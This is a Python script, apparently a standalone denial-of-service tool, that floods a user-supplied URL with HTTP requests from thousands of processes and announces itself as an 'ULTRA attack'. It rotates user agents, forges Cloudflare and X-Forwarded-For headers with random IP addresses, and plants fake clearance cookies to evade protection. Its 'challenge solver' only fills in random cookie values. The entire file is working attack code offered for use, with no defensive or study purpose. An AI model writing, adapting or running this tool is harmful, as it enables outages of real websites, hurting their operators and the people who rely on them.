#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from multiprocessing import Process, Manager, cpu_count
from fake_useragent import UserAgent
from urllib.parse import urlparse

MAX_RETRIES = 5
CONNECTION_TIMEOUT = 8
MAX_CONNECTIONS_PER_HOST = 150
TARGET_REQUESTS_PER_SECOND = 15000
WORKER_PROCESSES = min(3000, cpu_count() * 150)
USER_AGENT_ROTATION_FREQ = 50
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=20, connect=CONNECTION_TIMEOUT)
JITTER_RANGE = (0, 0.05)
CF_CHALLENGE_DELAY = (1, 7)

BASE_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'TE': 'trailers',
}

user_agent_rotator = UserAgent()
cf_versions = ['2023.05', '2023.07', '2023.09', '2024.01', '2024.03']
cf_ray_prefixes = ['8', '7', '6', '9', '5']
ip_countries = ['US', 'GB', 'DE', 'FR', 'CA', 'JP', 'BR', 'IN', 'AU', 'SG']

class CloudflareBypassUltra:
    @staticmethod
    def generate_headers():
        headers = BASE_HEADERS.copy()
        headers['User-Agent'] = user_agent_rotator.random
        headers['CF-IPCountry'] = random.choice(ip_countries)
        if random.random() > 0.3:
            headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        if random.random() > 0.6:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        if random.random() > 0.8:
            headers['CF-Visitor'] = '{"scheme":"https"}'
            headers['CF-Ray'] = f"{random.choice(cf_ray_prefixes)}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))}-{random.choice(['SJC', 'LAX', 'DFW', 'ORD', 'IAD', 'ATL', 'AMS', 'FRA', 'SIN'])}"
        if random.random() > 0.7:
            headers['Referer'] = f"https://www.google.com/search?q={''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,12)))}"
        return headers

    @staticmethod
    async def solve_js_challenge(session, url):
        await asyncio.sleep(random.uniform(*CF_CHALLENGE_DELAY))
        session.cookie_jar.update_cookies({
            'cf_clearance': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=128)),
            '__cfduid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=128)),
            '__cflb': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
        })
        session.headers.update({
            'CF-Client-Version': random.choice(cf_versions),
            'CF-Device-Type': random.choice(['desktop', 'mobile', 'tablet'])
        })
        return True

class RequestStatsUltra:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.cloudflare_challenges = 0
        self.start_time = time.time()
        self.last_print_time = self.start_time
        self.request_times = []
    
    def add_request(self, success, is_cf_challenge=False):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
        if is_cf_challenge:
            self.cloudflare_challenges += 1
        self.request_times.append(time.time())
        self.request_times = [t for t in self.request_times if t > time.time() - 60]
    
    def get_current_rps(self):
        if not self.request_times:
            return 0.0
        return len(self.request_times) / min(60, time.time() - self.request_times[0])
    
    def get_stats(self):
        elapsed = max(1, time.time() - self.start_time)
        return {
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'cloudflare_challenges': self.cloudflare_challenges,
            'requests_per_second': self.total_requests / elapsed,
            'current_rps': self.get_current_rps(),
            'success_rate': (self.successful_requests / self.total_requests) * 100 if self.total_requests else 0,
            'elapsed_time': elapsed,
        }

async def make_request_ultra(session, url, stats):
    headers = CloudflareBypassUltra.generate_headers()
    retry_count = 0
    success = False
    
    await asyncio.sleep(random.uniform(*JITTER_RANGE))
    
    while retry_count < MAX_RETRIES and not success:
        try:
            async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                content = await response.text()
                
                if response.status in [403, 429, 503] or "cloudflare" in content.lower() or "captcha" in content.lower():
                    stats.add_request(False, is_cf_challenge=True)
                    if await CloudflareBypassUltra.solve_js_challenge(session, url):
                        retry_count += 1
                        continue
                    else:
                        break
                
                if response.status >= 400:
                    stats.add_request(False)
                    retry_count += 1
                    await asyncio.sleep(random.uniform(0.5, 2.5))
                    continue
                
                stats.add_request(True)
                success = True
                
        except Exception:
            stats.add_request(False)
            retry_count += 1
            await asyncio.sleep(random.uniform(0.5, 3))
    
    return success

async def worker_ultra(url, duration, stats, shared_stats):
    conn = aiohttp.TCPConnector(
        limit=MAX_CONNECTIONS_PER_HOST,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=60,
        ssl=False
    )
    
    async with aiohttp.ClientSession(
        connector=conn,
        trust_env=True,
        headers=BASE_HEADERS
    ) as session:
        start_time = time.time()
        user_agent_counter = 0
        
        while time.time() - start_time < duration:
            if user_agent_counter >= USER_AGENT_ROTATION_FREQ:
                session.headers.update({'User-Agent': user_agent_rotator.random})
                user_agent_counter = 0
            
            await make_request_ultra(session, url, stats)
            user_agent_counter += 1
            
            if time.time() - stats.last_print_time >= 0.5:
                shared_stats.update(stats.get_stats())
                stats.last_print_time = time.time()

def process_worker_ultra(url, duration, shared_stats):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    stats = RequestStatsUltra()
    try:
        loop.run_until_complete(worker_ultra(url, duration, stats, shared_stats))
    finally:
        loop.close()

class MetricsLoggerUltra:
    @staticmethod
    def log_stats(stats, save_json=False):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{'='*60}")
        print(f"HTTP REQUEST TERMINATOR - ULTRA MODE")
        print(f"{'='*60}")
        print(f"Total Requests: {stats['total_requests']:,}")
        print(f"Successful: {stats['successful_requests']:,} ({stats['success_rate']:.2f}%)")
        print(f"Failed: {stats['failed_requests']:,}")
        print(f"CF Challenges: {stats['cloudflare_challenges']:,}")
        print(f"Avg RPS: {stats['requests_per_second']:,.2f}")
        print(f"Current RPS: {stats['current_rps']:,.2f}")
        print(f"Elapsed: {stats['elapsed_time']:.2f}s")
        print(f"{'='*60}")
        
        if save_json:
            with open(f"http_stats_ultra_{int(time.time())}.json", 'w') as f:
                json.dump(stats, f)

def validate_url_ultra(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def main_ultra():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <duration_in_seconds>")
        sys.exit(1)
    
    url = sys.argv[1]
    if not validate_url_ultra(url):
        print("Error: Invalid URL format")
        sys.exit(1)
    
    try:
        duration = float(sys.argv[2])
        if duration <= 0:
            raise ValueError
    except ValueError:
        print("Error: Duration must be positive seconds")
        sys.exit(1)
    
    print(f"Starting ULTRA attack on {url} for {duration} seconds...")
    print(f"Configuration: {WORKER_PROCESSES} workers, target {TARGET_REQUESTS_PER_SECOND:,} RPS")
    
    with Manager() as manager:
        shared_stats = manager.dict({
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'cloudflare_challenges': 0,
            'requests_per_second': 0.0,
            'current_rps': 0.0,
            'success_rate': 0.0,
            'elapsed_time': 0.0,
        })
        
        processes = []
        for _ in range(WORKER_PROCESSES):
            p = Process(target=process_worker_ultra, args=(url, duration, shared_stats))
            p.start()
            processes.append(p)
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                MetricsLoggerUltra.log_stats(dict(shared_stats))
                time.sleep(0.25)
            
            for p in processes:
                p.join(timeout=3)
                if p.is_alive():
                    p.terminate()
            
            MetricsLoggerUltra.log_stats(dict(shared_stats), save_json=True)
            print("\nULTRA attack completed!")
            
        except KeyboardInterrupt:
            print("\nTerminating ULTRA attack...")
            for p in processes:
                p.terminate()
            
            MetricsLoggerUltra.log_stats(dict(shared_stats), save_json=True)

if __name__ == "__main__":
    main_ultra()
